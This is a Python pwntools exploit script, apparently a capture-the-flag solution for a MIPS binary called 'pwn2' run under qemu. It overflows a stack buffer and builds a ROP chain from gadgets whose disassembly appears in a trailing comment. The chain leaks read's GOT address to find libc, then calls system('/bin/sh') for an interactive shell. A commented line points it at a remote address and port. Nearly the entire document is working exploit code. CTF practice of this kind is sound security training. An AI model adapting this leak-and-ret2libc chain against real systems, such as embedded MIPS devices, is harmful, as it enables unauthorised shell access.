#coding=utf-8
from pwn import *
context.log_level = 'debug' 
elf = ELF("./pwn2")
libc = ELF("./lib/libc.so.0")
p = process(["qemu-mipsel","-L",".","./pwn2"])
#p = remote("192.168.233.133", 9999)
p.sendlineafter("What's your name:", 'luckyu')
p.recvuntil("luckyu\n")
jr_s3210 = 0x4006c8
gadget = 0x4007a8
printf = 0x400794
payload = 'a'*(32+4)+p32(jr_s3210)+'a'*28
payload += p32(0)+p32(elf.got['read'])+p32(0x40092c)+p32(0)+p32(gadget)
payload += 'a'*0x20+p32(0x400ac0)
p.sendline(payload)
read_addr = u32(p.recv(4))
libc.address = read_addr - libc.sym['read']
print hex(libc.address)
payload = 'a'*(32+4)+p32(jr_s3210)+'a'*28
payload += p32(0)+p32(libc.search("/bin/sh").next())+p32(libc.sym['system'])+p32(0)+p32(gadget)
p.sendline(payload)
p.interactive()


'''
.text:004007A8                 move    $t9, $s2
.text:004007AC                 move    $a0, $s1
.text:004007B0                 lw      $ra, arg_24($sp)
.text:004007B4                 lw      $fp, arg_20($sp)
.text:004007B8                 addiu   $sp, 0x28
.text:004007BC                 jalr    $t9
.text:004007C0                 nop


.text:004006C8 loc_4006C8:                              # CODE XREF: __do_global_dtors_aux+28↑j
.text:004006C8                 lw      $ra, 0x30+var_4($sp)
.text:004006CC                 lw      $s3, 0x30+var_8($sp)
.text:004006D0                 lw      $s2, 0x30+var_C($sp)
.text:004006D4                 lw      $s1, 0x30+var_10($sp)
.text:004006D8                 lw      $s0, 0x30+var_14($sp)
.text:004006DC                 jr      $ra
.text:004006E0                 addiu   $sp, 0x30
'''